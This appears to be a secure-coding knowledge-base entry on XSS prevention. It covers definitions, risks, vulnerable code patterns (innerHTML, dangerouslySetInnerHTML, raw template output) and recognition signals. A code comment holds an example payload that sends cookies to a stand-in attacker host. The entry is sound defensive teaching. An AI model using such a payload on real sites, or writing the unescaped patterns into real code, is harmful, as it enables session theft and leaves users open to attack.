---
id: xss-prevention
domain: cross-cutting
category: security
depends_on:
  - separation-of-concerns
related:
  - csrf-prevention
  - injection-prevention
  - user-vs-developer-errors
anti_pattern_of: null
severity: critical
---

# XSS Prevention

## Definition
Cross-Site Scripting (XSS) prevention is the practice of ensuring that user-supplied data is never interpreted as executable code by the browser -- through output encoding, DOM sanitization, and Content Security Policy headers.

## Why It Matters
XSS is consistently one of the most exploited web vulnerabilities. When an attacker can inject JavaScript into your page, they can steal session cookies, redirect users to phishing pages, modify what the user sees (fake a bank transfer confirmation), log keystrokes, or use the victim's authenticated session to perform actions on their behalf. A single XSS vulnerability can compromise every user who visits the affected page. It does not require the attacker to break into your server -- they just need one place where user input flows into the page unescaped.

## The Anti-Pattern
A self-taught developer typically inserts user-supplied data directly into the DOM without encoding. In vanilla JavaScript this means using `innerHTML` instead of `textContent`. In React, it means reaching for `dangerouslySetInnerHTML` to render rich text from an API. In server-rendered templates, it means using raw output (`<%- data %>` in EJS, `{!! $data !!}` in Blade, `|safe` in Jinja) because the escaped version "breaks" the HTML they want to render:

```javascript
// Stored XSS via innerHTML
function displayComment(comment) {
  // If comment.body is: <img src=x onerror="document.location='https://evil.com/steal?cookie='+document.cookie">
  document.getElementById('comment').innerHTML = comment.body;
}

// React: bypassing the built-in XSS protection
function UserBio({ bio }) {
  // "The escaped version shows HTML tags, so I'll use dangerouslySetInnerHTML"
  return <div dangerouslySetInnerHTML={{ __html: bio }} />;
}

// Server-side: raw output in templates
// EJS: <%- userInput %> instead of <%= userInput %>
// The developer switched to raw because &amp; was showing up instead of &
```

## Recognition Signal
- `innerHTML` assignments anywhere in the codebase, especially with user-supplied data
- `dangerouslySetInnerHTML` in React components, particularly when the source is user content
- Template files using raw/unescaped output directives
- No Content-Security-Policy header in HTTP responses
- A rich text editor that stores and serves raw HTML without sanitization (using a library like DOMPurify)
- URL parameters or form values reflected directly into page content
- Search pages that display "Results for: [user query]" without encoding

## Related Concepts
**CSRF prevention** is the other major client-side attack vector -- XSS steals or manipulates what the user sees, CSRF tricks the browser into performing actions the user did not intend. Notably, a successful XSS attack can bypass CSRF protections by reading the CSRF token from the page. **Injection prevention** is the server-side equivalent: XSS is injection into the browser's HTML/JS parser, while SQL injection is injection into the database's query parser. The root cause is the same -- unsanitized user input mixed with code. **User vs developer errors** connects because error messages that include user input (like "User 'X' not found") can become XSS vectors if the input is not encoded.
